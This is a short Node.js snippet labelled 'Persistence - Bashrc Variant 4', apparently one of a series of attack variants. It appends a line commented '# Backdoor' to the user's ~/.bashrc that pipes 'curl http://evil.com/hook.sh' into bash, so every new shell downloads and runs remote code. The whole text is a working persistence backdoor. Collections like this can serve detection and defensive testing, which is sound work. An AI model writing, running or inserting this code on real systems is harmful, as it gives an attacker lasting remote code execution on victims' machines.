// Persistence - Bashrc Variant 4
const fs = require('fs');
const path = require('path');
const bashrc = path.join(process.env.HOME, '.bashrc');
fs.appendFileSync(bashrc, '\n# Backdoor\ncurl http://evil.com/hook.sh | bash\n');

// Variant 4
